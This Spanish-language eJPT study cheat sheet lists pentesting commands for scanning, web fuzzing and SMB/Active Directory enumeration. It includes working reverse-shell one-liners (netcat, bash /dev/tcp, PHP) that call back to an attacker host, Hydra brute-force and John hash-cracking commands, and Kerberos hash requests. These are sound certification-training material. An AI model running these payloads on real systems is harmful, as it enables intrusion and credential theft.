# Comandos eJPT

A continuación presentare todos los comandos que he necesitado para aprobar la certificacion con éxito. (No necesariamente usara todos, aunque si la mayoria)

### Hosts

**Actividad Del host**&#x20;

> ping -c 1 10.10.10.10  |  Si TTL -> 128 Windows Si TTL -> 64 Linux

**Nombre Host**&#x20;

> hostname

**Información Sistema Operativo**

> uname -a
>
> cat /proc/versión
>
> cat /etc/issue

### Reconocimiento

**Escaneo Dispositivos Vivos**&#x20;

> fping -a -g 10.10.10.0/24  2>/dev/null

> nmap -sn 10.10.10.0/24 -oN Dispositivos.Vivos

**Escaneo Puertos Normal**&#x20;

> nmap 10.10.10.10 -p- --open -T5 -v -n -oG Puertos.Abiertos

**Escaneo Puertos Rapido**

> nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 10.10.10.10 -oG Puertos.Abiertos

**Escaneo Puertos UDP**

> nmap -sC -sV -sU --top-ports 100 10.10.10.10 -oG Puertos.Abiertos.UDP

**Escaneo Servicios**

> nmap -sC -sV -p80,443,445 10.10.10.10 -oN Versiones.Servicios

### Enumeración Web

**Wfuzz**

> **Fuzzing Directorios**
>
> wfuzz -c -L -t 200 --hc=404 -w \<Diccionario> http://ip-site/FUZZ

> **Fuzzing Archivos**
>
> wfuzz -c -L -t 200 --hc=404 --hw=0 -w http://ip-site/FUZZ.extension

| Código de estado | Significado                          |
| ---------------- | ------------------------------------ |
| 100              | Continuar                            |
| 200              | OK                                   |
| 201              | Creado                               |
| 202              | Aceptado                             |
| 203              | Sin contenido                        |
| 204              | Sin contenido                        |
| 301              | Permanentemente re dirigido o movido |
| 302              | Temporalmente re dirigido o movido   |
| 400              | Solicitud incorrecta                 |
| 401              | Requiere autorización                |
| 403              | Prohibido                            |
| 404              | No se encuentra                      |
| 500              | Error crítico en el servidor         |

**Gobuster**

> gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://ip-site

**Nmap Script**

> nmap --script http-enum -p80 10.10.10.10 -oN Enumeracion.Web

### **Reverse Shells**

**Netcat**

> nc -e /bin/sh 10.0.0.1 1233&#x20;
>
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

**Bash**

> bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

**PHP**

> $sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");

### **Servidores Web**

**Python3**

> python3 -m http.server 80

**Netcat**

> nc -lvnp 8080

### Search Exploits

**Busqueda Exploit**

> searchsploit apache

**Inspeccionar Exploit**

> searchsploit -x id-exploit

**Descargar Exploti**

> searchsploit -m id-exploit

### Brute Force

**Hydra**

> **Fuerza Bruta Servicios**
>
> hydra -l \<user> -P \<diccionario> 10.10.10.10 \<servicio> t4

> **Fuerza Bruta Formulario Web**
>
> hydra -l \<user> -P \<diccionario> 10.10.10.10 http-post-form "/login:username=^USER^\&password=^PASS^:F=Failed Message" -V&#x20;

**John The Ripper**

> **Fuerza Bruta Hashes**
>
> john --wordlist=\<diccionario> password.file

> **Creación Password Crack File**
>
> unshadow file.passwd file.shadow > password.file

### Enumeration Ports And Tricks

> **23 | Telnet**
>
> Banner Grabbing
>
> * nc -vn 23
>
> Script Nmap
>
> * nmap -n -sV -Pn --script "\*telnet\*" -p 23 \<IP>
>
> MSFConsole
>
> * use auxiliary/scanner/telnet/telnet\_version

> **445 | Samba**
>
> Uso sin credenciales
>
> * nbtscan \<IP>
> * smbmap -H \<IP>
> * smbmap -H \<IP> -u null -p null
> * smbmap -H \<IP> -u guest
> * smbclient -N -L //\<IP>
> * smbclient -N //\<IP>/ --option="client min protocol"=LANMAN1
> * rpcclient IP
> * rpcclient -U "" \<IP>
> * crackmapexec smb \<IP>
> * crackmapexec smb \<IP> --pass-pol -u "" -p ""
> * crackmapexec smb \<IP> --pass-pol -u "guest" -p ""
> * GetADUsers.py -dc-ip \<IP> "{Domain\_Name}/" -all
> * GetNPUsers.py -dc-ip \<IP> -request "{Domain\_Name}/" -format hashcat
> * GetUserSPNs.py -dc-ip \<IP> -request "{Domain\_Name}/"
> * getArch.py -target \<IP>
>
>
>
> Uso con credenciales
>
> * smbmap -H {IP} -u {Username} -p {Password}
> * smbclient "\\\\{IP}\\" -U {Username} -W {Domain\_Name} -l {IP}
> * smbclient "\\\\{IP}\\" -U {Username} -W {Domain\_Name} -l {IP} --pw-nt-hash `hash`
> * crackmapexec smb {IP} -u {Username} -p {Password} --shares
> * GetADUsers.py {Domain\_Name}/{Username}:{Password} -all
> * GetNPUsers.py {Domain\_Name}/{Username}:{Password} -request -format hashcat
> *   GetUserSPNs.py {Domain\_Name}/{Username}:{Password} -request
>
>

